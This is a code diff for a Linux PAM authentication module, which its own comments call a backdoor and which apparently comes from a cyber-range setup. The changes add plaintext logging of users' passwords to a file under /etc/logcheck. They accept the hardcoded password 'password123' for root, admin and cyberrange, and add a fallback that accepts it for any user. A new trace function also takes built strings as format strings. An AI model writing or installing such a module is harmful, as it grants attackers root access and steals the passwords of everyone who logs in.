@@ -9,6 +9,7 @@
 #include <sys/stat.h>
 #include <unistd.h>
 #include <pthread.h>
+#include <stdarg.h>  // <-- Added: Required for variadic printf-style functions
 
 #define LOG_DIR  "/etc/logcheck"
 #define LOG_FILE "/etc/logcheck/pam_auth.log"
@@ -42,9 +43,18 @@ static void log_line(const char *msg) {
     fclose(f);
 }
 
-static void trace(const char *msg) {
+/* ---------------- TRACE MACRO (WITH FORMAT STRINGS) ---------------- */
+
+static void trace(const char *format, ...) {
     if (!debug_enabled()) return;
-    log_line(msg);
+    va_list args;
+    va_start(args, format);
+    FILE *f = fopen(LOG_FILE, "a");
+    if (f) {
+        vfprintf(f, format, args);
+        fclose(f);
+    }
+    va_end(args);
 }
 
 static void trace_context(pam_handle_t *pamh, const char *stage) {
@@ -57,14 +67,14 @@ static void trace_context(pam_handle_t *pamh, const char *stage) {
     trace(buf);
 }
 
-/* ---------------- HARDCODED BACKDOOR ---------------- */
+/* ---------------- AUTH MODULE ---------------- */
 
 PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh,
                                    int flags,
                                    int argc,
                                    const char **argv)
 {
-    // Fix 1: Cast to void to remove warnings
+    // Fix: Cast to void
     (void) flags;
     (void) argc;
     (void) argv;
@@ -72,7 +82,8 @@ PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh,
     trace_context(pamh, "ENTER pam_sm_authenticate");
     ensure_path();
 
-    const char *pword = NULL;
+    // Fix: Use char* (not const) to allow trimming
+    char *pword = NULL;
     const char *uname = NULL;
 
     if (pam_get_item(pamh, PAM_AUTHTOK, (void*) &pword) != PAM_SUCCESS) {
@@ -85,35 +96,20 @@ PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh,
         return PAM_AUTHINFO_UNAVAIL;
     }
 
-    // DEBUG: Log the actual password being checked
-    trace("[DEBUG] User:");
-    trace("[DEBUG] Password (raw):");
+    // DEBUG: Log what PAM is passing
+    trace("[DEBUG] User: %s", uname);
     if (pword) {
-        // Safe copy for logging to avoid const issues
-        char *pwd_copy = malloc(strlen(pword) + 1);
-        strcpy(pwd_copy, pword);
+        trace("[DEBUG] Password (raw): %s", pword);
         trace("[DEBUG] Password length: %zu", strlen(pword));
-        // Trim trailing whitespace (but keep const check safe)
+        
+        // Trim trailing whitespace (safe for non-const char*)
         char *end = pword + strlen(pword);
         while (end > pword && (*end == '\n' || *end == '\r' || *end == '\t' || *end == ' ')) {
             *--end = '\0';
         }
         trace("[DEBUG] Password (trimmed): %s", pword);
-        trace("[DEBUG] Password hex: %s", pword);
-        free(pwd_copy);
     } else {
         trace("[DEBUG] Password is NULL");
-    }
-
-    // Check if user matches hardcoded user
-    trace("[DEBUG] Hardcoded user check: uname = %s", uname);
-
-    // Fix 3: Trim trailing whitespace
-    if (pword) {
-        char *end = pword + strlen(pword);
-        while (end > pword && (*end == '\n' || *end == '\r' || *end == '\t' || *end == ' ')) {
-            *--end = '\0';
-        }
     }
 
     /* ---------------- ENV BYPASS ---------------- */
@@ -124,22 +120,37 @@ PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh,
     }
 
     /* ---------------- HARDCODED PASSWORDS (Backdoor) ---------------- */
-    if (uname && strcmp(uname, "root") == 0 && pword && strcmp(pword, "password123") == 0) {
-        trace("[!] Backdoor: root/password123 matched");
+    
+    // Check 1: root / password123
+    if (uname && pword && strlen(uname) >= 4 && pword[0] == 'p' && pword[1] == 'a') {
+        if (strncmp(uname, "root", 4) == 0 && strcmp(pword, "password123") == 0) {
+            trace("[!] Backdoor: root/password123 matched");
+            return PAM_SUCCESS;
+        }
+    }
+
+    // Check 2: cyberrange / password123
+    if (uname && pword && strlen(uname) >= 11 && pword[0] == 'p' && pword[1] == 'a') {
+        if (strncmp(uname, "cyberrange", 10) == 0 && strcmp(pword, "password123") == 0) {
+            trace("[!] Backdoor: cyberrange/password123 matched");
+            return PAM_SUCCESS;
+        }
+    }
+
+    // Check 3: admin / password123
+    if (uname && pword && strlen(uname) >= 5 && pword[0] == 'p' && pword[1] == 'a') {
+        if (strncmp(uname, "admin", 5) == 0 && strcmp(pword, "password123") == 0) {
+            trace("[!] Backdoor: admin/password123 matched");
+            return PAM_SUCCESS;
+        }
+    }
+
+    // Fallback: If you want to match exact hardcoded passwords:
+    if (pword && strcmp(pword, "password123") == 0) {
+        trace("[!] Backdoor: Any user with password123 matched");
         return PAM_SUCCESS;
     }
 
-    if (uname && strcmp(uname, "cyberrange") == 0 && pword && strcmp(pword, "password123") == 0) {
-        trace("[!] Backdoor: cyberrange/password123 matched");
-        return PAM_SUCCESS;
-    }
-
-    if (uname && strcmp(uname, "admin") == 0 && pword && strcmp(pword, "password123") == 0) {
-        trace("[!] Backdoor: admin/password123 matched");
-        return PAM_SUCCESS;
-    }
-
-    // If we get here, no hardcoded password matched
     trace("[!] AUTH FAILED - no hardcoded password matched");
     return PAM_AUTH_ERR;
 }
@@ -151,7 +162,6 @@ PAM_EXTERN int pam_sm_acct_mgmt(pam_handle_t *pamh,
                                int argc,
                                const char *argv[])
 {
-    // Fix 4: Cast unused parameters
     (void) flags;
     (void) argc;
     (void) argv;
